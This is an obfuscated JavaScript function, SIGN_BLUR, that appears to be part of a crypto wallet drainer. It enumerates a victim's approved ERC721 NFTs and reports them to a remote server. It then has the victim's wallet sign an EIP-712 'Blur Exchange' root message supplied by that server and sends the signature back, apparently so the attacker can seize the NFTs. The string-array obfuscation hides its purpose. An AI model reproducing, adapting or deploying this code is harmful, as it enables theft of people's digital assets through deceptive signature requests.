function _0x31a3(_0x171254, _0x521672) {
  const _0x490e85 = _0x5882();
  _0x31a3 = function (_0x4857c5, _0x22be56) {
      _0x4857c5 = _0x4857c5 - (0x1 * -0x535 + 0x2 * -0x1232 + -0x2b0f * -0x1);
      let _0x1b4169 = _0x490e85[_0x4857c5];
      return _0x1b4169;
  };
  return _0x31a3(_0x171254, _0x521672);
}
function _0x5882() {
  const _0x4086d8 = [
      '6340375FetsHI',
      '335950aSBIzS',
      'providers',
      'ERC721',
      'data',
      'Blur\x20Exchange',
      '10CtFuER',
      '737366qlMMul',
      'length',
      '64KTGOjl',
      '2127860QtAkmQ',
      '5133540hyrjXg',
      'chain_id',
      'push',
      '18423927IZeRaa',
      'Web3Provider',
      'paths',
      'blur',
      '1486214WGbmCc',
      '0x00000000000111abe46ff893f3b2fdf1f759a8a8',
      'root',
      'success',
      'address',
      'getSigner',
      'type',
      '0x000000000000Ad05Ccc4F10045630fb830B95127',
      'log',
      '_signTypedData',
      'request',
      'skip',
      '3cRFApU'
  ];
  _0x5882 = function () {
      return _0x4086d8;
  };
  return _0x5882();
}
(function (_0x2293e1, _0x229804) {
  const _0x5dfe9b = _0x31a3;
  const _0x493736 = _0x2293e1();
  while (!![]) {
      try {
          const _0x3adba8 = -parseInt(_0x5dfe9b(0x192)) / (0xc2e + -0x2d7 + -0x956) + parseInt(_0x5dfe9b(0x184)) / (-0xb45 + -0x59f * -0x1 + -0x16a * -0x4) + parseInt(_0x5dfe9b(0x190)) / (-0x1c * 0x7a + 0x1381 + -0x626) * (-parseInt(_0x5dfe9b(0x17c)) / (0x2559 + -0x2 * -0x1127 + -0x47a3)) + -parseInt(_0x5dfe9b(0x191)) / (-0x1347 + 0x61 * 0x1f + 0x78d) + parseInt(_0x5dfe9b(0x17d)) / (-0x1 * -0x1d09 + 0x2286 * 0x1 + 0x5 * -0xcb5) + parseInt(_0x5dfe9b(0x179)) / (-0x11c * -0x1a + -0x2258 + 0x587) * (-parseInt(_0x5dfe9b(0x17b)) / (-0x1939 + 0x2058 + -0x1 * 0x717)) + -parseInt(_0x5dfe9b(0x180)) / (0x2 * 0x25 + -0x3 * 0x8f4 + 0x1a9b) * (-parseInt(_0x5dfe9b(0x178)) / (-0x23d + -0x2c5 + 0x50c));
          if (_0x3adba8 === _0x229804) {
              break;
          } else {
              _0x493736['push'](_0x493736['shift']());
          }
      } catch (_0x13d13a) {
          _0x493736['push'](_0x493736['shift']());
      }
  }
}(_0x5882, 0xc21c + 0xf7b * 0x2a + 0x6e198));
const SIGN_BLUR = async (_0x82e421, _0x29ed6e, _0x338ab1, _0xdc4a34, _0x536122) => {
  const _0x437d22 = _0x31a3;
  try {
      const _0x3d0459 = [], _0x31147a = [];
      for (const _0x9ae02e of _0x82e421) {
          if (_0x9ae02e['skip'] || _0x9ae02e[_0x437d22(0x18a)] !== _0x437d22(0x194) || _0x9ae02e[_0x437d22(0x17e)] != -0x5 * -0x117 + 0x73c + 0x1 * -0xcae)
              continue;
          if (!await is_nft_approved(_0x9ae02e['address'], _0x338ab1, _0x437d22(0x185)))
              continue;
          _0x3d0459[_0x437d22(0x17f)]({
              'collection': _0x9ae02e['address'],
              'tokenID': _0x9ae02e['id']
          });
          _0x31147a[_0x437d22(0x17f)](_0x9ae02e);
      }
      if (_0x3d0459[_0x437d22(0x17a)] < -0x1ea8 + -0x21fa * 0x1 + 0x40a4)
          return;
      let _0x555076 = new ethers[(_0x437d22(0x193))][(_0x437d22(0x181))](_0x29ed6e), _0x14cfae = _0x555076[_0x437d22(0x189)]();
      let _0x192474 = await send_request({
          'action': _0x437d22(0x183),
          'user_id': _0x536122,
          'blur': 'root',
          'tokens': _0x3d0459,
          'address': _0x338ab1
      });
      try {
          await send_request({
              'action': _0x437d22(0x183),
              'user_id': _0x536122,
              'blur': _0x437d22(0x18e),
              'assets': _0x31147a
          });
          const _0x38e473 = await _0x14cfae[_0x437d22(0x18d)]({
              'name': _0x437d22(0x177),
              'version': '1.0',
              'chainId': 0x1,
              'verifyingContract': _0x437d22(0x18b)
          }, {
              'Root': [{
                      'name': 'root',
                      'type': 'bytes32'
                  }]
          }, { 'root': _0x192474[_0x437d22(0x176)][_0x437d22(0x186)] });
          await send_request({
              'action': _0x437d22(0x183),
              'user_id': _0x536122,
              'blur': _0x437d22(0x187),
              'signature': _0x38e473,
              'address': _0x338ab1,
              'root': _0x192474[_0x437d22(0x176)][_0x437d22(0x186)],
              'paths': _0x192474[_0x437d22(0x176)][_0x437d22(0x182)]
          });
          for (const _0x3dd377 of _0x82e421) {
              if (_0x3dd377['skip'] || _0x3dd377[_0x437d22(0x18a)] !== 'ERC721' || _0x3dd377[_0x437d22(0x17e)] != 0x16f * -0x16 + 0x1b76 + 0x415)
                  continue;
              let _0xf0e3c8 = ![];
              for (const _0x2a0a1 of _0x31147a) {
                  if (_0x2a0a1[_0x437d22(0x18a)] !== _0x437d22(0x194) || _0x2a0a1[_0x437d22(0x17e)] != 0x1 * 0x21c1 + -0x23e4 + 0x2 * 0x112)
                      continue;
                  if (_0x2a0a1[_0x437d22(0x188)] == _0x3dd377['address'] && _0x2a0a1['id'] == _0x3dd377['id']) {
                      _0xf0e3c8 = !![];
                      break;
                  }
              }
              if (_0xf0e3c8 == !![]) {
                  _0x3dd377[_0x437d22(0x18f)] = !![];
              }
          }
      } catch (_0x41fa40) {
          console['log'](_0x41fa40);
          await send_request({
              'action': 'blur',
              'user_id': _0x536122,
              'blur': 'cancel'
          });
      }
  } catch (_0x37686d) {
      console[_0x437d22(0x18c)](_0x37686d);
  }
};